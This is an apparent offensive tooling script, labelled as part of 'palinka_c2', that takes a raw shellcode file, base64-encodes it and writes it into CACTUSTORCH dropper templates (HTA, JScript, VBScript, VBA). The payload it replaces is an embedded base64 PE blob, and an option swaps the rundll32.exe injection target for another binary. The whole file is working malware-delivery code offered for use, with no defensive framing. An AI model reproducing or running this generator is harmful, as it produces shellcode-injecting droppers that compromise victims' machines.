import os
import base64
import argparse

p = argparse.ArgumentParser(description='Welcome to palinka_c2')
p.add_argument('-r', '--raw_shellcode', help='Input raw shellcode file.')
p.add_argument('-o', '--output_dir', default=None, help='Output dir.')
p.add_argument('-b', '--binary_inject', default=None, help='Binary to inject into instead of rundll32.exe.')
args = p.parse_args()

## modify only these
to_mod = ('.hta','.js','.jse','.vba','.vbe','.vbs')
old_payload = 'TVroAAAAAFtSRVWJ5YHDcoAAAP/TicNXaAQAAABQ/9Bo8LWiVmgFAAAAUP/TAAAAAAAAAAAAAAAAAAAA8AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAACf0hwW27NyRduzckXbs3JFZvzkRdqzckXF4fZF8rNyRcXh50XIs3JFxeHxRVqzckX8dQlF1LNyRduzc0UGs3JFxeH7RWKzckXF4eBF2rNyRcXh40Xas3JFUmljaNuzckUAAAAAAAAAAAAAAAAAAAAAUEUAAEwBBQBOViNZAAAAAAAAAADgAAKhCwEJAABCAgAA4gAAAAAAAFFvAQAAEAAAAGACAAAAABAAEAAAAAIAAAUAAAAAAAAABQAAAAA'

old_bin = 'rundll32.exe'
new_bin = args.binary_inject

if not args.raw_shellcode:
	print('Need to specify the shellcode file')
	exit(1)

if os.path.isfile(args.raw_shellcode):
	with open(args.raw_shellcode, 'rb') as rb:
		b64_payload = base64.b64encode(rb.read()).decode()
else:
	print('Raw shellcode file not present.')
	exit(1)
	
def split_len(seq, length):
	return [seq[i:i+length] for i in range(0, len(seq), length)]

directory = os.getcwd()
for filename in os.listdir(directory):
	if filename.endswith(to_mod):
		rr = os.path.join(directory, filename)
		if args.output_dir:
			if os.path.isdir(args.output_dir):
				ww = os.path.join(args.output_dir, filename.replace('CACTUSTORCH','mypayload'))
			else:
				print('Output dir does nto exists.')
		else:
			ww = os.path.join(directory, filename.replace('CACTUSTORCH','mypayload'))

		if os.path.isfile(rr):
			with open(rr, 'r') as fr:
				with open(ww, 'w') as fw:
					if 'vba' in rr:
						new_output = '\n'.join( [f'    code = code & "{a}"' for a in split_len(b64_payload, 100)] )
						old_output = '\n'.join( [f'    code = code & "{a}"' for a in split_len(old_payload, 100)] )
						fr_str = fr.read()
						if new_bin:
							fw.write(fr_str.replace(old_output, new_output).replace(old_bin, new_bin))
						else:
							fw.write(fr_str.replace(old_output, new_output))
					else:
						for l in fr:
							if new_bin:
								fw.write(l.replace(old_payload, b64_payload).replace(old_bin, new_bin))
							else:
								fw.write(l.replace(old_payload, b64_payload))
